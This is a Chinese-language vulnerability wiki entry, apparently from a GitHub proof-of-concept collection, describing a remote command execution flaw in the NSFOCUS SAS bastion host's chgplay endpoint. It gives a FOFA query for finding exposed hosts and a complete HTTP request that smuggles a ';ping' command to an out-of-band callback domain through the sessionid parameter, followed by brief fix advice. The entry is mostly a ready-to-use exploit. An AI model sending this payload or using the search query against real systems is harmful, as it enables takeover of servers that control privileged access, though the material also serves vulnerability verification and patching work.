# 绿盟 SAS堡垒机 chgplay 远程命令执行漏洞

# 漏洞描述

绿盟 SAS堡垒机 chgplay 远程命令执行漏洞，攻击者可利用该漏洞执行任意命令，导致服务器失陷。

# 影响版本

绿盟 SAS堡垒机

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="needUsbkey.php?username"

POC/EXP：****

```
GET /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=%3Bping%206imejt6m.eyes.sh%3B HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9

```

![image-20250314135049252](./.resource/绿盟SAS堡垒机chgplay远程命令执行漏洞/media/image-20250314135049252.png)


![image-20250314135123853](./.resource/绿盟SAS堡垒机chgplay远程命令执行漏洞/media/image-20250314135123853.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
